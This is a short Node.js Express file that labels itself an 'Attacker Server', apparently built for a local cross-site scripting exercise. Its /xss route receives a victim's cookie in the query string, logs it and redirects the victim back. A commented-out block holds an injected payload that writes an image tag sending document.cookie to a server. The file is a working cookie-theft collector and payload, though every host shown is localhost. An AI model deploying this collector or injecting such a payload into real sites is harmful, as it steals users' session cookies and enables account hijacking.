import express from 'express';
import path from 'path';

const app = express();
const port = 4000;

app.get('/xss', (req, res) => {
    const cookieValue = req.query.cookie; 
    console.log('Received cookie:', cookieValue); 
    res.redirect('http://localhost:3000/');
})

// app.get('/xss.js', (req, res) => {
//     document.write('<img src="http://localhost:3000/?'+document.cookie+'">');
//     res.sendFile(path.join(__dirname, 'xss.js'));
// });

app.get("/", (req, res) => {
    res.send('Attacker Server');
});

app.listen(port, () => {
    console.log(`Attacker server is running on port http://localhost:${port}`);
});
